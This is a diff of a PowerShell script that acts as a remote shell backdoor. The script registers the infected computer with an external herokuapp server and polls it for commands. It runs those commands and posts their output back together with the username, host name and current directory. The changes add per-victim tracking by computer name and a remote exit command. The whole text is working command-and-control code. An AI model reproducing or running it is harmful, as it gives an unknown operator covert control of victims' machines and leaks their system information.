@@ -3,7 +3,17 @@
 
 $__url = "https://reverse80.herokuapp.com/"
 
-$__params = @{output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
+try
+{
+	$__params = @{name = $env:computername}
+	$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "init") -Body $__params
+}
+catch
+{
+	exit
+}
+
+$__params = @{name = $env:computername; output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
 $__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
 
 while (1 -eq 1)
@@ -12,7 +22,8 @@ while (1 -eq 1)
 	
 	try
 	{
-		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "cmd")).Content
+		$__params = @{name = $env:computername}
+		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "cmd") -Body $__params).Content
 	}
 	catch
 	{
@@ -24,6 +35,10 @@ while (1 -eq 1)
 	{
 		Sleep 2
 		continue
+	}
+	elseif ($__cmd -eq "__exit__")
+	{
+		exit
 	}
 	
 	$__result = ""
@@ -41,6 +56,6 @@ while (1 -eq 1)
 
 	$__output = $__result + $__err
 	
-	$__params = @{output = $__output + "`nPS " + (pwd).Path + "> "}
+	$__params = @{name = $env:computername; output = $__output + "`nPS " + (pwd).Path + "> "}
 	$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
 }
